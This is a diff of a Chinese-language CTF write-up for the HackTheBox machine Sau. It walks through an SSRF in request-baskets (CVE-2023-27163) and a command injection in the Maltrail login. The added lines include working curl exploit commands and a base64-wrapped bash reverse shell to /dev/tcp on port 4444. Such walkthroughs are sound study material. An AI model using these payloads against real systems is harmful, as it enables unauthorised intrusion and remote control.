@@ -1,13 +1,12 @@
-**Waiting for machine retire...**
-
-*Difficulty: Easy*
-
+---
+tags:
+  - HTB/Linux
+  - HTB/Easy
 ---
 
 ## Summary
 
-xxx
-
+...
 ### Attack Path Overview
 
 ![attack-path](./AttackPath/HTB-Sau.png){ width='450' }
@@ -43,6 +42,11 @@ PORT      STATE    SERVICE REASON      VERSION
 
 ### PoC (CVE-2023-27163)
 
+谷歌一下“request-baskets version 1.2.1 exploit”，直接发现一个[github的PoC](https://gist.github.com/b33t1e/3079c10c88cad379fb166c389ce3b7b3)  
+> POC: POST /api/baskets/{name} API with payload - {"forward_url": "http://127.0.0.1:80/test","proxy_response": false,"insecure_tls": false,"expand_path": true,"capacity": 250}  
+> details can be seen: <https://notes.sjtu.edu.cn/s/MUUhEymt7>
+
+说是SSRF，还附上了详细信息的链接。看了几遍都没懂怎么利用，于是还是回头研究一下这个web应用的功能。
 
 ### 研究网页功能
 
@@ -53,11 +57,34 @@ PORT      STATE    SERVICE REASON      VERSION
 
 ![HTB-Sau-port55555-basket](./evidence-img/HTB-Sau-port55555-basket.png)
 
+所以基本理清楚了PoC的利用方式。即创建一个接收请求的basket，并将它配置为你想forward的url，PoC文章里是“http://127.0.0.1:80/test”。而我们这台靶机也疑似运行着80端口，只是没有公开。所以如果我们将forward_url配置为“http://127.0.0.1:80”就有可能访问到那个本地的80端口。
 
+### exploit尝试
+
+最开始直接复制PoC的payload，仅更改了forward_url，然后访问我的basket URL后似乎毫无反应：
+```bash
+└─$ curl -XPOST http://10.10.11.224:55555/api/baskets/testt1 --data '{"forward_url": "http://127.0.0.1:80/","proxy_response": false,"insecure_tls": false,"expand_path": true,"capacity": 250}'
+{"token":"slDpTH4PFTm5VvWg8_ouQxQAVfjA11yosY-XRQAJi451"}
+
+└─$ curl http://10.10.11.224:55555/testt1
+
+```
+
+琢磨了半天，最终在Settings界面看到关于 `proxy_response` 参数的解释（下图），这么看的话这个界面的3个方框和capacity都是对于 `forward_url` 的配置。而刚刚的payload里是 `"proxy_response": false`，如果设置为true（即将这个设置勾上），那么应该在请求我们的basket URL之后，basket会将请求转发到 `forward_url` 并接收响应返回给我们。相当于是个代理。  
+*不理解payload参数直接复制就用不可取啊……*  
+![HTB-Sau-port55555-basket-settings](./evidence-img/HTB-Sau-port55555-basket-settings.png)
 
 ### 本地80端口暴露
 
+以及突然想到，既然PoC的payload即用POST API创建一个配置好的basket，那其实也可以不用命令行，直接在网页创建basket再更改设置，效果应该一样？  
+于是试着在网页创建basket并按下图配置之后，访问我的basket（http://10.10.11.224:55555/poc11）。  
+![HTB-Sau-port55555-basket-PoC-settings](./evidence-img/HTB-Sau-port55555-basket-PoC-settings.png)
 
+果然可以。成功暴露目标的本地80端口。  
+本来以为一定要按照PoC的参数来，没想到Settings界面的capacity保持原本的200不变也行。  
+![HTB-Sau-port55555-basket-PoC-forward](./evidence-img/HTB-Sau-port55555-basket-PoC-forward.png)
+
+很明显，这个80端口服务的页脚写着 `Maltrail (v0.53)`。
 
 
 ## Initial Access
@@ -71,6 +98,20 @@ PoC：
 
 原来最开始nmap扫描结果里被filtered的8338就是这个Maltrail啊。都联系起来了！
 
+那么测试一下8338这个命令注入。  
+首先继续利用之前那个PoC，将basket的forward_url设置更改为 `http://127.0.0.1:8338/login`，让本地8338服务的目标URL暴露。  
+既然是命令注入的话，先试试能否执行curl连到我的kali吧：
+
+- 在kali用python简单开个http服务：`python -m http.server 80`
+- 然后向basket发送payload：``curl -XPOST http://10.10.11.224:55555/poc11 --data 'username=;`curl 10.xx.xx.xx:80`'``  
+
+python的http服务成功收到响应。  
+
+那么再想想如何利用这个命令注入——既然能反连回来，那当然得弄个反弹shell看看。  
+开启监听，不过试了好几条插入反弹shell的命令都无法执行成功，想着可能是特殊字符的问题，于是尝试传递base64再解码执行的方式。  
+执行下面payload，成功get shell。其中 `<rshell-base64>` 的部分为 `/bin/bash -i >& /dev/tcp/10.xx.xx.xx/4444 0>&1` 的base64编码。
+
+- payload：``curl -XPOST http://10.10.11.224:55555/poc11 --data 'username=;`echo "<rshell-base64>" |base64 -d |bash`'``  
 
 
 ## flag: user
